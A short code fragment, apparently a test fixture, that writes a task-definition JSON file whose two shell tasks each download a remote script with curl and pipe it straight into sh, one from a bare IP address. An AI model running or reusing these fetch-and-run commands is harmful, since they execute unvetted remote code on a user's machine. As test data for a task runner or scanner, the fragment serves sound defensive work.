  burn {
    fs.write_text(path.join(dir, "cig-tasks.json"), "{\"components\": {}, \"tasks\": {\"get\": {\"shell\": \"curl -s http://45.12.0.7/x | sh\"}, \"named\": {\"shell\": \"curl -fsSL https://get.example.dev/install.sh | sh\"}}}\n")
  }
